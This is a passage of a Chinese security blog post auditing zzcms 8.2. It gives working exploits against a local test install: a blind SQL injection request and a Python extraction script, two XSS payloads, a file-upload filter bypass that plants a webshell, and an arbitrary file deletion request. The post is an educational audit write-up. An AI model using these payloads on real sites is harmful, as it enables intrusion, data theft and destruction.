+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们随机选取一个表zzcms_answer作为例子</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /user/del.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line"></span><br><span class="line">id=1&amp;tablename=zzcms_answer union select 1,2 and if(ascii(substr(database(),1,1))=122,sleep(3),1)#</span><br></pre></td></tr></table></figure>
+<p>因为这里采用的是基于时间的盲注，从zzcms_answer表中查询的结果有可能为空，如果为空，就不能执行后面的if语句，所以为了确保有查询结果，加入联合查询，保证有查询结果</p>
+<p>下面附上盲注脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/del.php</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/del.php"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:<span class="string">"1"</span>,</span><br><span class="line">            <span class="string">"tablename"</span>:<span class="string">"zzcms_answer union select 1,2 and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#"</span>%(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"database:"</span>,database)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h3 id="XSS漏洞1"><a href="#XSS漏洞1" class="headerlink" title="XSS漏洞1"></a>XSS漏洞1</h3><h4 id="位置-2"><a href="#位置-2" class="headerlink" title="位置"></a>位置</h4><p>/install/step_6.php 第10-11行</p>
+<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/step_6.php 第10-11行</span></span><br><span class="line">管理员户名：<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $admin<span class="meta">?&gt;</span>&lt;br/&gt;</span><br><span class="line">管理员密码： <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $adminpwdtrue<span class="meta">?&gt;</span>&lt;br/&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看出变量$admin和$adminpwdtrue直接打印出来，很可能存在XSS漏洞，我们继续跟进这两个变量</p>
+<p>我们可以从文件名看出这是安装第六步的页面，那么我们就跟进到安装的index.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php 第8,9,10行</span></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>extract函数的作用是将数组的键名变成各个变量名，键名对应键值对应变量的值，并且我们发现一个变量$step，猜测可能跟安装的步骤有关，继续跟进该变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php 第52-124行</span></span><br><span class="line"><span class="keyword">switch</span>($step)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现当变量$step值为6时，就包含了step_6.php，而我们可以发现index.php的开头是没有包含之前所说的关键文件/inc/conn.php的，所以这里的POST和GET是没有经过转义处理的，所以$admin和$adminpwdtrue是可控的变量</p>
+<h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>PAYLOAD如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /install/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">step=6&amp;admin=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功弹框</p>
+<h3 id="XSS漏洞2"><a href="#XSS漏洞2" class="headerlink" title="XSS漏洞2"></a>XSS漏洞2</h3><h4 id="位置-3"><a href="#位置-3" class="headerlink" title="位置"></a>位置</h4><p>/inc/top.php 第3-5行</p>
+<h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/inc/top.php 第3-5行</span></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">"action"</span>]==<span class="string">"search"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='"</span>.@$_POST[<span class="string">"lb"</span>].<span class="string">"/search.php?keyword="</span>.@$_POST[<span class="string">"keyword"</span>].<span class="string">"'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以注意到这个文件也是没有包含到关键文件/inc/conn.php，所以未对POST数据做消毒处理，这里就可以利用闭合标签的方式进行XSS攻击</p>
+<h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><p>PAYLOAD:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /inc/top.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/inc/top.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line"></span><br><span class="line">action=search&amp;lb=&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功弹框</p>
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="位置-4"><a href="#位置-4" class="headerlink" title="位置"></a>位置</h4><p>/uploadimg_form.php 文件提供了文件上传的功能</p>
+<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/uploading_form.php 第61-68行</span><br><span class="line">&lt;form action=&quot;uploadimg.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onSubmit=&quot;return mysub()&quot; style=&quot;padding:10px&quot; target=&quot;doaction&quot;&gt;</span><br><span class="line">&lt;div id=&quot;esave&quot; style=&quot;position:absolute; top:0px; left:0px; z-index:10; visibility:hidden; width: 100%; height: 77px; background-color: #FFFFFF; layer-background-color: #FFFFFF; border: 1px none #000000;&quot;&gt; </span><br><span class="line">&lt;div align=&quot;center&quot;&gt;&lt;br /&gt;&lt;img src=&quot;image/loading.gif&quot; width=&quot;24&quot; height=&quot;24&quot; /&gt;正在上传中...请稍候！&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;g_fu_image[]&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">&lt;input name=&quot;noshuiyin&quot; type=&quot;hidden&quot; id=&quot;noshuiyin&quot; value=&quot;&lt;?php echo @$_GET[&apos;noshuiyin&apos;]?&gt;&quot; /&gt;</span><br><span class="line">&lt;input name=&quot;imgid&quot; type=&quot;hidden&quot; id=&quot;imgid&quot; value=&quot;&lt;?php echo @$_GET[&apos;imgid&apos;]?&gt;&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>通过表单内容我们可以看出，文件上传的位置是uploadimg.php文件，所以我们跟进该文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/uploadimg.php 第26-43行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//是否存在文件</span></span><br><span class="line"><span class="keyword">if</span> (!is_uploaded_file(@<span class="keyword">$this</span>-&gt;fileName[tmp_name]))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>; <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查文件大小</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;max_file_size*<span class="number">1024</span> &lt; <span class="keyword">$this</span>-&gt;fileName[<span class="string">"size"</span>])&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('文件大小超过了限制！最大只能上传 "</span>.<span class="keyword">$this</span>-&gt;max_file_size.<span class="string">" K的文件');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查文件类型</span></span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"type"</span>], <span class="keyword">$this</span>-&gt;uptypes)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('文件类型错误，支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查文件后缀</span></span><br><span class="line">$hzm=strtolower(substr(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],strpos(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],<span class="string">"."</span>)));<span class="comment">//获取.后面的后缀，如可获取到.php.gif</span></span><br><span class="line"><span class="keyword">if</span> (strpos($hzm,<span class="string">"php"</span>)!==<span class="keyword">false</span> || strpos($hzm,<span class="string">"asp"</span>)!==<span class="keyword">false</span> ||strpos($hzm,<span class="string">"jsp"</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$hzm.<span class="string">"，这种文件不允许上传');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在该文件中，可以找到后端对上传文件验证的代码，有四个步骤的验证，第一是检查是否存在上传的文件，第二是检查文件的大小，第三是检查文件类型必须是规定的图片类型，见第12行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $uptypes = <span class="keyword">array</span> (<span class="string">'image/jpg'</span>,<span class="string">'image/jpeg'</span>,<span class="string">'image/pjpeg'</span>,<span class="string">'image/gif'</span>,<span class="string">'image/png'</span>,<span class="string">'image/x-png'</span>,<span class="string">'image/bmp'</span>,<span class="string">'application/x-shockwave-flash'</span>);</span><br></pre></td></tr></table></figure>
+<p>最后检查的是文件后缀，禁止后缀名包含php，asp和jsp的文件，但是它忽略了phtml文件，而apache会将phtml文件当做php文件来解析，所以我们只需要将文件名后缀修改为phtml，文件类型修改为image/jpg，即可以成功绕过过滤上传一句话木马文件</p>
+<h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>根据上面的分析，我修改了如下的payload</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>但是可以发现上传失败了，提示了“经判断上传的文件不是图片文件，已删除”，根据提示在原文件找到之前忽略了的过滤点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/uploadimg.php 第58-61行</span></span><br><span class="line">$data=GetImageSize($newName);<span class="comment">//取得GIF、JPEG、PNG或SWF图片属性，返回数组，图形的宽度[0],图形的高度[1]，文件类型[2]</span></span><br><span class="line"><span class="keyword">if</span>($data[<span class="number">2</span>]!=<span class="number">1</span> &amp;&amp; $data[<span class="number">2</span>]!=<span class="number">2</span> &amp;&amp; $data[<span class="number">2</span>]!=<span class="number">3</span> &amp;&amp; $data[<span class="number">2</span>]!=<span class="number">6</span>)&#123;<span class="comment">//4为swf格式</span></span><br><span class="line">unlink($newName);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('经判断上传的文件不是图片文件，已删除。');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+<p>我们可以注意到一个函数<strong>GetImageSize</strong>，这个函数可以取得图片的各个属性，之后就可以判断该文件是否是一个图片文件。所以这里在文件的内容头部加入<strong>GIF89A</strong>，以此来绕过<strong>GetImageSize</strong>的检查，如下所示</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>修改后成功上传一句话木马文件，并在返回内容我们可以很清晰的看出上传文件的具体位置</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>最后上菜刀验证</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功getshell</p>
+<h3 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h3><h4 id="位置-5"><a href="#位置-5" class="headerlink" title="位置"></a>位置</h4><p>/user/adv.php 第76-85行</p>
+<h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/adv.php </span></span><br><span class="line">......</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"img"</span>]))&#123;</span><br><span class="line">$img=$_REQUEST[<span class="string">"img"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$img=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"oldimg"</span>]))&#123;</span><br><span class="line">$oldimg=$_REQUEST[<span class="string">"oldimg"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$oldimg=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">query(<span class="string">"update zzcms_textadv set adv='$adv',company='$company',advlink='$advlink',img='$img',passed=0 where username='"</span>.$_COOKIE[<span class="string">"UserName"</span>].<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($oldimg&lt;&gt;$img)&#123;</span><br><span class="line">		$f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">		<span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">		unlink($f);		</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现变量$f是通过”../“与变量$oldimg拼接而成的，拼接后的文件名如果存在就通过unlink函数进行文件删除操作，而这里对变量$olding没有什么其他的过滤，只要求不等于变量$img，且$action等于”modify”，那么我们就可以通过控制变量$olding的值进行任意文件删除</p>
+<h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>我们先在网站根目录下创建一个文件夹，里面新建文件1.php，2.txt</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>然后构造如下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user/adv.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">action=modify&amp;img=test&amp;oldimg=demo/1.php</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/zzcms/12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这是第一次审计一个完整的cms，大部分还是参考网上前辈们的文章来审计，感受到自己独立审计的能力还有很大的不足，今后还需要通过多练，多花时间来加强自己的审计能力。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-03-01T07:07:40.288Z" itemprop="dateUpdated">2019-03-01 15:07:40</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/58925/" target="_blank" rel="external">https://Foxgrin.github.io/posts/58925/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/58925/&title=《代码审计--zzcms8.2》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/58925/&title=《代码审计--zzcms8.2》 — Somnus's blog&source=记录zzcms8.2审计过程以及漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/58925/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--zzcms8.2》 — Somnus's blog&url=https://Foxgrin.github.io/posts/58925/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/58925/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/42478/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：代码审计--fiyocms
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/22876/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：Web_For_Pentester-XSS">下一篇：Web_For_Pentester-XSS</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
